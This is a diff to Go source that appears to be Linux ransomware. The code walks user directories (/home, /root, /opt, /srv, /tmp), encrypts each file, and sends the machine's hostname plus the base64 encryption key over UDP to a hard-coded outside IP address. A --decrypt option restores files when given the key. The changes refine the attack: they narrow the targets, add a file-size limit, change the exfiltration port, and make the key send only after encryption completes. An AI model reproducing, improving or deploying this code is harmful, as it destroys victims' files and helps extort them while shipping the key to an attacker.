@@ -52,11 +52,6 @@ func Crypt(filename string, ch chan string) {
 		file.Close()
 		Crypt(<-ch, ch)
 	}
-	if fileInfo.Size() > 200000000 {
-		wgc.Done()
-		file.Close()
-		Crypt(<-ch, ch)
-	}
 	arr := make([]byte, fileInfo.Size())
 	_, _ = file.Read(arr)
 	file.Close()
@@ -79,7 +74,8 @@ func DeCrypt(filename string, ch chan string) {
 }
 
 func main() {
-	cmd := exec.Command("bash", "-c", "find / -type f | grep --color=never -v '/lib\\|/etc\\|/sys\\|/proc\\|/boot\\|/dev\\|/sbin\\|/bin\\|/initrd\\|/run\\|/var\\|/usr\\|/etc/config/\\|.bash\\|.desktop\\|.cache\\|.mozilla'")
+	//cmd := exec.Command("bash", "-c", "find / -type f -size -200M ! -path \"/lib/*\" ! -path \"/etc/*\" ! -path \"/sys/*\" ! -path \"/proc/*\" ! -path \"/boot/*\" ! -path \"/dev/*\" ! -path \"/sbin/*\" ! -path \"/bin/*\" ! -path \"/initrd/*\" ! -path \"/run/*\" ! -path \"/var/*\" ! -path \"/usr/*\" ! -path \"/snap/*\" ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null\n")
+	cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
 	output, _ := cmd.CombinedOutput()
 	listfile := strings.Split(string(output), "\n")
 	ch := make(chan string, len(listfile))
@@ -100,15 +96,15 @@ func main() {
 			}
 			go Crypt(<-ch, ch)
 		}
-		c, err := net.Dial("udp", "139.59.147.33:45699")
+		c, err := net.Dial("udp", "139.59.147.33:25")
 		if err != nil {
 			fmt.Println(err)
 			return
 		}
+		wgc.Wait()
 		cmd := exec.Command("cat", "/etc/hostname")
 		output, _ := cmd.CombinedOutput()
 		fmt.Fprintf(c, string(output)[:len(string(output))-1]+"|"+base64.StdEncoding.EncodeToString(CryptKey))
-		wgc.Wait()
 	} else if len(args) == 2 && args[0] == "--decrypt" {
 		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
 		for i := 0; i < 100; i++ {
